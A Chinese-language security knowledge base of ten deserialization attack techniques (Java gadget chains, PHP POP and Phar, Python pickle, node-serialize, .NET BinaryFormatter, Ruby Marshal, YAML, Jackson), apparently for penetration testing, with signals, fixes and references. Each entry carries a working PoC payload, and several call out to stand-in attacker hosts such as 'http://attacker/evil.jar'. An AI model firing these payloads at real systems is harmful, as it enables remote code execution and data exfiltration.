# 反序列化攻击技术 (Deserialization Attacks)

> 来源: PortSwigger Academy / OWASP / HackTricks / ysoserial
> 条目数: 10 | 分类: 反序列化 (Deserialization)

---

### [KB-DES-01] Java URLDNS Gadget Chain
- **信号**: Java 应用接收序列化对象输入；反序列化入口点（如 REST API 接收 Base64 编码的序列化对象）；Cookie 以 `rO0` 开头（Base64 编码的 Java 序列化魔术字节）
- **原理**: Java `ObjectInputStream.readObject()` 不加过滤反序列化任意类，URLDNS gadget 通过 `HashMap.readObject()` → `URL.hashCode()` → `URLStreamHandler.getHostAddress()` 触发 DNS 查询，用于盲检测反序列化漏洞
- **最小PoC**: `java -jar ysoserial.jar URLDNS http://collaborator.burpcollaborator.net | base64` → 发送至目标 → Burp Collaborator 收到 DNS 查询
- **绕过与变体**: 配合 CommonsCollections/DNS 做全链利用而非纯探测；JRMP 监听器触发回连
- **修复**: 反序列化前做类型白名单校验（Look-Ahead Deserialization）；使用安全的序列化格式（JSON/Protobuf）；Java 17+ 的 `ObjectInputFilter`
- **参考**: CWE-502 / PortSwigger: Java Deserialization / ysoserial

---

### [KB-DES-02] Java CommonsCollections Gadget Chain
- **信号**: URLDNS 确认反序列化漏洞存在；目标 classpath 包含 Apache Commons Collections 3.x/4.x
- **原理**: CommonsCollections 的 `Transformer` 链通过 `ChainedTransformer` + `ConstantTransformer` + `InvokerTransformer` 构造任意方法调用，最终执行 `Runtime.exec()`
- **最小PoC**: `java -jar ysoserial.jar CommonsCollections4 'curl http://collaborator/$(whoami)' | base64` → OOB 确认命令执行
- **绕过与变体**: CommonsCollections1-7 各版本适配；CommonsBeanutils 无 CC 依赖的替代链；JDK 版本决定可用链（CC1 仅 ≤8u71）
- **修复**: 升级 Commons Collections 至 3.2.2+/4.1+ 并禁用不安全反序列化；类型白名单 + `ObjectInputFilter`
- **参考**: CWE-502 / ysoserial / PortSwigger: Java Deserialization labs

---

### [KB-DES-03] PHP 反序列化 — `__wakeup` 与 POP Chains
- **信号**: Cookie/session/POST 参数中包含 `O:数字:"类名"` 格式的序列化字符串；应用使用 `unserialize()` 处理用户输入
- **原理**: PHP `unserialize()` 自动调用 `__wakeup()` 和 `__destruct()` 魔术方法，通过串联多个类的魔术方法构造 POP (Property-Oriented Programming) 链，最终执行文件操作、命令执行或数据库写入
- **最小PoC**: `O:8:"MyClass":1:{s:4:"file";s:10:"/etc/passwd";}` → 若 `MyClass.__destruct()` 执行 `file_get_contents($this->file)` 则泄露文件
- **绕过与变体**: PHP 7.4+ `__wakeup` 绕过（CVE-2016-7124）；`__serialize`/`__unserialize` 替代魔术方法；Phar 反序列化无需 `unserialize()` 调用
- **修复**: 禁止对用户输入调用 `unserialize()`；必须使用时限制允许类列表（`unserialize(['allowed_classes'=>[...]])`）；使用 JSON 替代 PHP 序列化
- **参考**: CWE-502 / PortSwigger: PHP Deserialization / HackTricks: PHP Deserialization

---

### [KB-DES-04] PHP Phar 反序列化
- **信号**: 应用使用 `file_exists()` / `is_file()` / `include()` 等文件系统函数处理用户可控路径，且未做 Phar 协议过滤
- **原理**: PHP 的 Phar 文件在解析时会触发其中存储的序列化 metadata 的反序列化，即使没有显式调用 `unserialize()`；通过上传或 `phar://` 协议指向攻击者控制的 Phar 文件触发反序列化
- **最小PoC**: 构造含恶意 metadata 的 `.phar` 文件 → 使用 `phar://uploads/evil.jpg` 路径触发 `file_exists('phar://uploads/evil.jpg')` → 反序列化执行
- **绕过与变体**: 文件扩展名可任意（只要内部是 Phar 格式）；`phar://` 协议可能未被 `allowed_classes` 限制；配合文件上传及路径操控
- **修复**: 禁用 `phar://` 协议；文件操作函数前检查路径不包含 `phar://`；对所有文件系统操作的输入做白名单校验
- **参考**: CWE-502 / PHP Phar Deserialization (BlackHat 2018) / HackTricks

---

### [KB-DES-05] Python Pickle 反序列化
- **信号**: API 接收 Base64 编码的 pickle 数据；Cookie 以 pickle 序列化存储；Flask session 未使用 `itsdangerous` 签名
- **原理**: Python `pickle.loads()` 在反序列化时自动调用 `__reduce__()` 方法，攻击者构造恶意对象的 `__reduce__` 返回 `(os.system, ('command',))` 实现命令执行
- **最小PoC**: `pickle.loads(b"cos\nsystem\n(S'id'\ntR.")` → 执行 `id` 命令
- **绕过与变体**: `__reduce_ex__` 替代 `__reduce__`；Cloudpickle/Joblib 等扩展 pickle 的攻击面；PyTorch `torch.load()` 使用 pickle 的安全风险
- **修复**: 禁止反序列化不受信任的 pickle 数据；使用 JSON/MessagePack 等安全格式；使用 `pickle.Unpickler` 的 `find_class` 钩子做白名单限制
- **参考**: CWE-502 / Python Security / HackTricks: Pickle Deserialization

---

### [KB-DES-06] Node.js `node-serialize` 反序列化
- **信号**: Node.js 应用使用 `node-serialize` / `serialize-javascript` 等不安全库处理用户输入；Cookie 以 `{"type":"Buffer","data":[...]}` 格式出现
- **原理**: `node-serialize` 的 `unserialize()` 在反序列化时会执行通过 IIFE 嵌入的 JavaScript 代码，无需 `eval()` 即可远程代码执行
- **最小PoC**: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}` → `unserialize(payload)` 执行命令
- **绕过与变体**: `serialize-javascript` 旧版本不安全；`safe-eval` 沙箱逃逸；`vm.runInNewContext` 沙箱逃逸（`this.constructor.constructor()`）
- **修复**: 使用 JSON.parse() 替代任意反序列化库；对序列化库升级到安全版本并禁用 IIFE 执行功能
- **参考**: CWE-502 / Node.js deserialization RCE / PortSwigger: Node Deserialization

---

### [KB-DES-07] .NET `TypeConfuseDelegate` 反序列化
- **信号**: .NET 应用反序列化用户输入的 BinaryFormatter / SoapFormatter 数据；Web.config 中 `viewState` 使用 `ObjectStateFormatter`；Base64 编码的序列化数据以 `AAEAAAD/////` 开头
- **原理**: .NET `BinaryFormatter` 通过 `TypeConfuseDelegate` gadget，利用 `SortedSet<string>` 的比较器委托与多播委托的类型混淆，劫持执行流实现任意方法调用
- **最小PoC**: `ysoserial.net -g TypeConfuseDelegate -c "cmd /c whoami" -f BinaryFormatter | base64` → 发送至反序列化端点
- **绕过与变体**: `WindowsIdentity` gadget（提权至 SYSTEM）；`ObjectDataProvider` gadget（进程启动）；`SessionSecurityToken` 伪造；`LosFormatter` 利用
- **修复**: 禁止 `BinaryFormatter`/`SoapFormatter`/`LosFormatter`；迁移至 `System.Text.Json`；类型白名单 + SerializationBinder
- **参考**: CWE-502 / ysoserial.net / PortSwigger: .NET Deserialization

---

### [KB-DES-08] Ruby `Marshal.load` 反序列化
- **信号**: Ruby/Rails 应用处理 Marshal 序列化数据（Cookie 以 `BAh` 开头 — Base64 编码的 Marshal 魔术字节）；Redis 中存储 Marshal 数据
- **原理**: Ruby `Marshal.load` 反序列化用户可控数据时，通过构造带 `instance_variable_get` / `instance_eval` 的 gadget 链实现 RCE；常见链：`Gem::StubSpecification` → `Gem::Source::Git` → `Kernel.open("|command")`
- **最小PoC**: 使用 Universal RCE Marshal payload → `Marshal.load(Base64.decode64(payload))` → 命令执行
- **绕过与变体**: YAML 反序列化在 Rails 中同样危险（`YAML.load` 旧版本的 `Psych` 不安全的 `load`）；`ERB` 内嵌代码块
- **修复**: 禁止 `Marshal.load` 处理用户输入；Rails 使用加密和签名的 Cookie（`secret_key_base`）；使用 JSON 序列化
- **参考**: CWE-502 / Ruby deserialization / Elastic Security: Marshal.load

---

### [KB-DES-09] YAML 反序列化攻击
- **信号**: 应用解析用户提交的 YAML 配置；API 接受 YAML 格式请求；CI/CD 管道中的 `.yaml` 文件由用户控制
- **原理**: Python `yaml.load()` 的默认 Loader 可执行任意 Python 对象构造；Ruby `YAML.load` 可创建任意对象；Java SnakeYAML 默认支持任意类实例化。所有语言的 YAML 不安全加载均等价于反序列化 RCE
- **最小PoC**: Python: `yaml.load("!!python/object/new:os.system ['id']")`；Ruby: `--- !ruby/object:Gem::StubSpecification ...`；Java SnakeYAML: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/evil.jar"]]]]`
- **绕过与变体**: 多种标签前缀绕过过滤；Spring Boot `spring.yaml` 属性注入；Kubernetes YAML manifest 中的恶意对象
- **修复**: 使用 `yaml.safe_load()` (Python) / `YAML.safe_load` (Ruby) / `SafeConstructor` (Java SnakeYAML)；禁止解析用户提供的 YAML
- **参考**: CWE-502 / OWASP: YAML Deserialization / HackTricks: SnakeYAML

---

### [KB-DES-10] Jackson 多态反序列化
- **信号**: Java Spring Boot 应用使用 Jackson 解析 JSON；`@JsonTypeInfo` 注解启用多态类型；请求 JSON 中包含 `@class` 字段
- **原理**: Jackson 默认不在 JSON 中实例化任意类，但启用多态类型后 `@class` / `@type` 字段可指定反序列化的目标类。结合 gadget 类（如 `ch.qos.logback.core.db.JNDIConnectionSource`）通过 JNDI 注入实现 RCE
- **最小PoC**: `{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}` → JNDI lookup 加载恶意类
- **绕过与变体**: `enableDefaultTyping()` 全局开启时的利用；Fastjson 类似多态反序列化问题；Gson 的 Polymorphic 配置
- **修复**: 禁用 Jackson 的 `enableDefaultTyping()`；使用白名单限制多态类型（`@JsonTypeInfo(use=NAME, include=PROPERTY)` + `activateDefaultTyping` 的白名单模式）；升级 Jackson 到最新并启用 `jackson-databind` 的安全默认配置
- **参考**: CWE-502 / Jackson CVE-2017-7525 / PortSwigger: Jackson Deserialization
